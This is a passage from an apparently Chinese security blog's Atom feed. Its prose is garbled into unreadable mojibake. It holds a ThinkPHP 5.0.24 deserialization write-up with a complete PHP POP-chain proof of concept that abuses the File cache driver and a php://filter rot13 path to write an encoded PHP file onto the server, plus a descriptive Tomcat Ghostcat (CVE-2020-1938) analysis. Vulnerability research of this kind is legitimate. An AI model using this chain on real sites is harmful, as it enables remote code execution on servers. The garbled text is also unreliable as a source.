‰∏≠ÁöÑÈÄªËæëÂà§Êñ≠ÊéßÂà∂ËøîÂõûÂÄºÔºü</p><p>ÈÄöËøáÊêúÂØªÔºåÂèëÁé∞ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ Model ‰∏ìÈó®Áî®‰∫éËøîÂõûÁõÆÊ†áÁ±ªÔºå‰ΩÜÊòØÊ≥®ÊÑèÁî±‰∫éModelÊ≤°ÊúâÂÆûÁé∞getBindAttr‰∏çÊª°Ë∂≥Êù°‰ª∂‰∏âÔºå‰∏îÂ≠êÁ±ªÂùá‰πüÊú™ÂÆûÁé∞Ê≠§ÊñπÊ≥ïÔºåÊâÄ‰ª•ÊòØ‰∏çÂèØË°åÁöÑÔºõËÄåÂÖ∂‰ªñÁöÑÁ±ªÂú®ÊéßÂà∂ËøîÂõûÁõÆÊ†áÁ±ªÊó∂ÂÄôÂ∞±ÂæàÁ¥Ø‰∫Ü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826971735907.jpg" alt="-w703"></p><h4 id="ÁõÆÊ†áÁ±ª"><a href="#ÁõÆÊ†áÁ±ª" class="headerlink" title="ÁõÆÊ†áÁ±ª"></a>ÁõÆÊ†áÁ±ª</h4><p>Áé∞Âú®Êàë‰ª¨ËÉΩÁ°ÆÂÆömodelRelationÂêéÔºåÊàë‰ª¨Áé∞Âú®ÈúÄË¶ÅÂÅöÁöÑÊòØÊâæÂà∞‰∏Ä‰∏™ÁõÆÊ†áÁ±ªÔºåÂÜçÁ°ÆÂÆöÂ¶Ç‰ΩïËøõ‰∏ÄÊ≠•Âà©Áî®ÔºåÈÄöËøáÊêúÂØª<code>__call</code>ÔºåÁ≤óÁï•ÁúãÂà∞Áñë‰ººËÉΩÂà©Áî®ÁöÑÊúâ<code>Request</code>Âíå<code>Output</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826978995403.jpg" alt="-w703"></p><p>‰ΩÜÂÆûÈôÖ‰∏äÔºåÂú®5.0.24ÁâàÊú¨‰∏≠Ôºå<code>\think\Request::__call</code>Èáå<code>self::$hook</code>ÊòØÊó†Ê≥ïÂà©Áî®ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826979780166.jpg" alt="-w727"></p><p>ÊâÄ‰ª•ËÉΩÂà©Áî®ÁöÑÂè™Êúâ OutputÔºåÁî±‰∫é‰º†ÂÖ•ÁöÑ<code>$mothod==&#39;getAttr&#39;</code>ÔºåÊâÄ‰ª•ËøôÈáåÂà©Áî® block ÂáΩÊï∞ËæÉÂ•Ω</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826983024896.jpg" alt="-w725"></p><p>ËÄåÂú®block ÂáΩÊï∞‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞ÊúÄÁªà‰ºöË∞ÉÁî®<code>$this-&gt;handle</code>‰∏ãÁöÑ write ÂáΩÊï∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826983826820.jpg" alt="-w669"></p><h4 id="write-Âà©Áî®"><a href="#write-Âà©Áî®" class="headerlink" title="write Âà©Áî®"></a>write Âà©Áî®</h4><p>Êàë‰ª¨ÂÖ®Â±ÄÊêúÁ¥¢‰∏ã write ÂáΩÊï∞ÁöÑÂÆûÁé∞ÔºåÂêåÊó∂Ê≥®ÊÑèÂà∞<strong>PHP ‰ºöËá™Âä®ÂøΩÁï•‰º†Ëæì‰∏≠Â§öÂá∫Êù•ÁöÑÂèÇÊï∞</strong></p><p>Áñë‰ººÂèØÂà©Áî®ÁöÑÁ±ªÊúâ‰∏â‰∏™ÔºåÂÆûÁé∞‰∏äÈÉΩÊòØ<code>$this-&gt;handler-&gt;set(...)</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826989229084.jpg" alt="-w895"></p><p>ÊâÄ‰ª•Êàë‰ª¨ËøòË¶ÅÂÖ®Â±ÄÊêúÁ¥¢‰∏ã set ÂáΩÊï∞ÁöÑÂÆûÁé∞Ôºå‰ª•‰∏ã‰∏§‰∏™Á±ªÊúÄÁªàÈÉΩÂÆûÁé∞‰∫Ü<code>file_put_contents</code>ÂÜôÊñá‰ª∂</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826992159835.jpg" alt="-w886"></p><p>‰ΩÜÊòØÊ≥®ÊÑèÂà∞<code>\think\cache\driver\Lite::set</code>‰∏≠ÂÜôÂÖ•Êó∂Ë¢´ÂµåÂÖ•Âú® php ÁéØÂ¢É‰∏≠‰∏îË¢´ÂºïÂè∑ÂåÖË£πÔºåÊó†Ê≥ïÂÆûÁé∞Âà©Áî®</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827014331691.jpg" alt="-w814"><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827015000819.jpg" alt="-w809"></p><p>ÊâÄ‰ª•ËÉΩÂà©Áî®ÁöÑ‰πüÂè™Êúâ<code>\think\cache\driver\File::set</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826995764409.jpg" alt="-w750"></p><p>Âè¶Â§ñÊ≥®ÊÑèÂà∞ÔºåÂÖ∂ÂÆû‰∏çÊòØ‰∏ÄÊ¨°ÊÄßË∞ÉÁî®<code>set -&gt; file_put_contents</code>ÂÆûÁé∞ÁöÑÂÜôÂÖ•ÔºåËÄåÊòØÂú®<code>$this-&gt;setTagItem</code>‰∏≠Áî±Ê≤°ÊúâÁºìÂ≠òÔºåÂØºËá¥Â∞Ü filename ‰Ωú‰∏∫Êñ∞ÁöÑÂÜÖÂÆπËøõË°å‰∫åÊ¨°ÂÜôÂÖ•</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827016902485.jpg" alt="-w560"></p><h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p>Áõ¥Êé•‰∏ä‰∫∫ÂÆ∂ÁöÑÂõæÔºåÊñáÁ´†ÈìæÊé•Âú®ÂèÇËÄÉËµÑÊñô‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827018116768.jpg" alt></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Êñá‰ª∂ÂêçÁîüÊàêËßÑÂàô</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token string">'sari3l'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&lt;?cuc cucvasb();?>'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>POC</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'expire'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token string">'cache_subdir'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//        'path' => './sari3l/',</span>        <span class="token string">'path'</span> <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?>',</span>        <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token operator">=</span><span class="token string">'sari3l'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"sari3l"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"test"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"sari3l"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Ê≥®ÊÑè"><a href="#Ê≥®ÊÑè" class="headerlink" title="Ê≥®ÊÑè"></a>Ê≥®ÊÑè</h2><h3 id="parent-‰øÆÈ•∞ËØç"><a href="#parent-‰øÆÈ•∞ËØç" class="headerlink" title="parent ‰øÆÈ•∞ËØç"></a>parent ‰øÆÈ•∞ËØç</h3><p>‰∏çÂêå TP ÁâàÊú¨‰∏≠ÔºåÂØπ‰∫é<code>$parent</code>‰øÆÈ•∞ËØç‰∏çÂêåÔºåÊâÄ‰ª•ÂàùÂßãÂåñË¶ÜÁõñÊó∂ÈúÄË¶ÅÊ≥®ÊÑè‰ª•Â≠êÁ±ª‰∏∫‰∏ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827032216313.jpg" alt="-w1041"></p><h3 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h3><p>Êó¢ÁÑ∂Ë¶ÅÂá∫Áé∞<code>&lt;</code>ÂΩìÁÑ∂ÊòØÂè™ËÉΩ Linux ÁéØÂ¢É‰∫Ü</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">ThinkPHP v5.0.x ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Áî±‰∫éÊüê‰∫õÂéüÂõ†Â≠¶‰π†‰∫Ü‰∏ãÁõ∏ÂÖ≥ÂÜÖÂÆπÔºå‰ª•Ê≠§ÂÅö‰∏ãÁ¨îËÆ∞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="‰ª£Á†ÅÂÆ°ËÆ°" scheme="https://blog.sari3l.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://blog.sari3l.com/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://blog.sari3l.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1938ÔºàGhost CatÔºâÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/7d9ef63e/"/>
    <id>https://blog.sari3l.com/posts/7d9ef63e/</id>
    <published>2020-02-22T14:58:15.000Z</published>
    <updated>2020-07-06T09:44:55.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂΩ±ÂìçËåÉÂõ¥"><a href="#ÂΩ±ÂìçËåÉÂõ¥" class="headerlink" title="ÂΩ±ÂìçËåÉÂõ¥"></a>ÂΩ±ÂìçËåÉÂõ¥</h2><ul><li>7.*ÂàÜÊîØ7.0.100‰πãÂâçÁâàÊú¨ÔºåÂª∫ËÆÆÊõ¥Êñ∞Âà∞7.0.100ÁâàÊú¨</li><li>8.*ÂàÜÊîØ8.5.51‰πãÂâçÁâàÊú¨ÔºåÂª∫ËÆÆÊõ¥Êñ∞Âà∞8.5.51ÁâàÊú¨</li><li>9.*ÂàÜÊîØ9.0.31‰πãÂâçÁâàÊú¨ÔºåÂª∫ËÆÆÊõ¥Êñ∞Âà∞9.0.31ÁâàÊú¨</li></ul><h2 id="Âü∫Á°ÄÂÜÖÂÆπ"><a href="#Âü∫Á°ÄÂÜÖÂÆπ" class="headerlink" title="Âü∫Á°ÄÂÜÖÂÆπ"></a>Âü∫Á°ÄÂÜÖÂÆπ</h2><h3 id="AJP-ÂçèËÆÆ"><a href="#AJP-ÂçèËÆÆ" class="headerlink" title="AJP ÂçèËÆÆ"></a>AJP ÂçèËÆÆ</h3><p>Ê†πÊçÆ<a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">ÂÆòÊñπÊñáÊ°£</a>ÔºåÂæàÂÆπÊòìÁºñÂÜô POC</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823837381066.jpg" alt="-w604"></p><h3 id="Tomcat-Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ"><a href="#Tomcat-Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ" class="headerlink" title="Tomcat Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ"></a>Tomcat Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ</h3><p>ÈÄöËøá<code>org.apache.catalina.connector.CoyoteAdapter#postParseRequest</code>ÊñπÊ≥ïÔºåÂ∞Ü<code>org.apache.coyote.Request</code>‰∏≠ÁöÑÂÜÖÂÆπËß£ÊûêÂà∞<code>org.apache.catalina.connector.Request</code>‰∏≠</p><ul><li>reqÂíåresÊòØadapter.serviceÁöÑÂèÇÊï∞</li><li>requestÂíåresponseÊòØ‰πãÂêéÂ∞ÜË¶ÅË∞ÉÁî®ÊñπÊ≥ïÁöÑÂèÇÊï∞</li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822936892645.jpg" alt="-w751"></p><p>ËÄåÂú®org.apache.catalina.mapper.Mapper#internalMap‰∏≠Ôºå‰ºöÈÄöËøáÈÅçÂéÜÊ≥®ÂÜåÁöÑ contextÔºåÈÄâÂèñÂêéÈù¢Â∞ÜÈááÁî®ÁöÑ‰∏ä‰∏ãÊñáÂÜÖÂÆπ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/map%20%E6%98%A0%E5%B0%84%E6%9F%A5%E6%89%BE%20context.png" alt="map Êò†Â∞ÑÊü•Êâæ context"></p><p>contextVersion.resources Â∞ÜË¢´‰º†ÈÄí‰∏ªË¶ÅÊúâ‰∏§ÁÇπ‰ΩúÁî®</p><ol><li>allResources ËÆ∞ÂΩï webapps ÂàóË°® </li><li>cache Ë¢´Áî®‰∫éÊü•ËØ¢ËµÑÊ∫êÁºìÂ≠ò</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822933382195.jpg" alt="-w748"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822972672708.jpg" alt="-w1180"></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823839595422.jpg" alt="-w673"></p><h3 id="DefaultServlet"><a href="#DefaultServlet" class="headerlink" title="DefaultServlet"></a>DefaultServlet</h3><p>Âú®<code>org.apache.catalina.servlets.DefaultServlet</code>‰∏≠‰∏§‰∏™ÂÖ≥ÈîÆÁÇπ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822955189031.jpg" alt="-w641"></p><ol><li><p>Á¨¨‰∏Ä‰∏™Êñ≠ÁÇπÂ§ÑÔºåÈÄöËøá<code>getRelativePath</code>ÊñπÊ≥ïÊãºÊé•servletPathÂèäpath_infoËé∑ÂèñËµÑÊ∫êÁõ∏ÂØπË∑ØÂæÑ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822953862652.jpg" alt="-w1071"></p></li><li><p>Á¨¨‰∫å‰∏™Êñ≠ÁÇπÂ§ÑÔºåÁî®‰∫éLFIËØªÂèñËµÑÊ∫êÔºå‰∏ªË¶ÅÂú®‰∫éÈÄöËøá resourceCache Ëé∑ÂèñËµÑÊ∫êÁºìÂ≠ò</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822974093233.jpg" alt="-w1043"></p><p> ËøîÂõûÂêé‰ºöËøõ‰∏ÄÊ≠•ÂØπËµÑÊ∫êÊúâÊïàÊÄßËøõË°åÊ£ÄÊü•ÔºåÊ≠§Êó∂Â∞±Áî®Âà∞‰∫Ü‰∏äÈù¢ÊèêÂà∞ÁöÑallResources</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823470477609.jpg" alt="-w717"></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823474384469.jpg" alt="-w1565"></p></li></ol><h3 id="JspServlet"><a href="#JspServlet" class="headerlink" title="JspServlet"></a>JspServlet</h3><p><code>org.apache.jasper.servlet.JspServlet</code>ÂÆûÈôÖÂíåDefaultServletÈÄªËæëÂæàÁõ∏‰ºº<br>ÂÖàÈÄöËøáÊãºÊé•servletPathÂèäpath_infoËé∑ÂèñjspÊñá‰ª∂uri</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823651035294.jpg" alt="-w649"></p><p>ÁÑ∂ÂêéËøõÂÖ•<code>org.apache.jasper.servlet.JspServlet#serviceJspFile</code>ÔºåËøôÈáåÂ∞ÜÁõÆÊ†áÊÅ∂ÊÑèÊñá‰ª∂‰Ωú‰∏∫ servlet ËøõË°åÂ§ÑÁêÜ</p><blockquote><ol><li>ServletÂÆπÂô®Ë¥üË¥£‰∏∫‰ΩøÁî®JasperÁöÑWebÂ∫îÁî®Á®ãÂ∫è‰∏ä‰∏ãÊñáÊèê‰æõURLClassLoader</li><li>JspServletÂ∞ÜËØ∑Ê±ÇËΩ¨ÁªôJspServletWrapperÁöÑserviceÊñπÊ≥ïËøõË°åÂ§ÑÁêÜ</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823652759535.jpg" alt="-w1046"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823826112197.jpg" alt="-w963"></p><h4 id="Ë∞ÉÁî®Ê†à"><a href="#Ë∞ÉÁî®Ê†à" class="headerlink" title="Ë∞ÉÁî®Ê†à"></a>Ë∞ÉÁî®Ê†à</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823832619467.jpg" alt="-w544"></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://www.cnblogs.com/coldridgeValley/p/6252781.html" target="_blank" rel="noopener">TomcatÂØπHTTPËØ∑Ê±ÇÁöÑÂ§ÑÁêÜ(‰∫å)</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ÂèØÂà©Áî®ÁöÑ servlet ÊÑüËßâÂèØ‰ª•Êé¢Á¥¢‰∏ÄÊ≥¢&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Tomcat" scheme="https://blog.sari3l.com/tags/Tomcat/"/>
    
      <category term="LFI" scheme="https://blog.sari3l.com/tags/LFI/"/>
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>JDBC Deserialization</title>
    <link href="https://blog.sari3l.com/posts/2cc5b12d/"/>
    <id>https://blog.sari3l.com/posts/2cc5b12d/</id>
    <published>2020-01-17T11:42:17.000Z</published>
    <updated>2020-07-06T09:45:17.435Z</updated>
    
